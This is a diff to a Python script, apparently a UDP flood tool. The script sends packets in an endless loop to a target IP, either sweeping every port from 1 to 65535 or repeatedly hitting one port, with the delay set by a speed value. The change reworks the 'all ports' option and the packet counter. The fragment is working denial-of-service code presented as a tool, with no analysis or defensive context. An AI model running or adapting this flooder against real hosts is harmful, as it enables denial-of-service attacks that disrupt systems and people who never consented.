@@ -50,17 +50,19 @@ print("\033[93m")
 ###################################################################################
 
 sent = 0
-if port == 00000:
-     port = 1     
+if port == "all":
+     port = 1
+     sent = 1     
      while True:
           sock.sendto(bytes, (ip,port))
-          sent = sent + 1
           port = port + 1
           print ("Has sent %s packet %s port %d"%(sent,ip,port))
           time.sleep((1000-speed)/2000)
           if port == 65535:
                port = 1
+               sent = sent + 1
 else:
+     port = int(port)
      while True:
           sock.sendto(bytes, (ip,port))
           sent = sent + 1
